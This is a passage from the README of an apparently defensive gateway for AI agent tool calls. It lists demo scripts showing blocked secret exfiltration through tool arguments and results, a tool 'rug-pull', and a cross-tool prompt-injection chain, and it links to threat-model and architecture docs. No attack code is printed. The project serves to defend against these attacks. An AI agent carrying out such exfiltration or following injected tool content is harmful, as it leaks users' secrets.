[`docs/THREAT_MODEL.md`](docs/THREAT_MODEL.md#context-guard-cross-tool-escalation-defense-adr-0013) and
[ADR-0013](docs/AI_DECISIONS.md) for the full model and its explicit non-goals.

## Architecture

Component responsibilities, system and sequence diagrams, the audit data model, and trust boundaries:
[`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md).

## Demo and verification

```sh
node examples/secret-exfiltration/demo.mjs       # inbound attack demo: secret in tool-call arguments (self-cleaning)
node examples/downstream-secret-result/demo.mjs  # outbound demo: secret in a downstream result AND error (self-cleaning)
node examples/policy-drift-replay/demo.mjs       # Safe Replay demo: policy drift, no execution (self-cleaning)
node examples/tool-rug-pull/demo.mjs             # Tool Integrity demo: rug-pull blocked before execution (self-cleaning)
node examples/context-poisoning/demo.mjs         # Context Guard demo: cross-tool prompt-injection chain blocked (self-cleaning)
node scripts/verify-packed-install.mjs           # packed-tarball install verification (self-cleaning)
node packages/gateway/dist/cli.js smoke-test     # built-in harmless proof AgentGate works (self-cleaning)
pnpm run test                                    # unit/integration tests (policy + gateway + control-center)
pnpm run lint                                    # type-aware lint gate across the whole workspace
```

Everything the demo and test suite assert is cross-checked in [`docs/VERIFICATION.md`](docs/VERIFICATION.md).

## Development and contributing

Workspace layout, running the gateway and Control Center locally, adding policy rules and tests:
[`docs/DEVELOPMENT.md`](docs/DEVELOPMENT.md). Contribution process, security-impact expectations for PRs, and
decision-ledger conventions: [`CONTRIBUTING.md`](CONTRIBUTING.md). Found a vulnerability? See
[`SECURITY.md`](SECURITY.md) — please do not open a public issue.

## License

[Apache License 2.0](LICENSE).
